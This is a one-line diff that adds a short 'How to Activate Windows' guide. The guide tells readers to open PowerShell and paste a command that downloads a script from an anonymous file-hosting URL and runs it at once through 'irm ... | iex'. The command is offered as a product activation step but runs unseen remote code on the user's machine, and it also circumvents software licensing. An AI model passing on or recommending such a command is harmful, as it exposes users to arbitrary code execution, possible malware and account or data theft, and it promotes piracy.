@@ -1,0 +1,1 @@
+How to Activate windows ? Method 1 - PowerShell Click the Start Menu, type PowerShell, and open it. Copy and paste the code below and press Enter. For Windows 8.1, 10 and 11: irm 'https://upload.filehost.lol/vcpIU?19=8' | iex
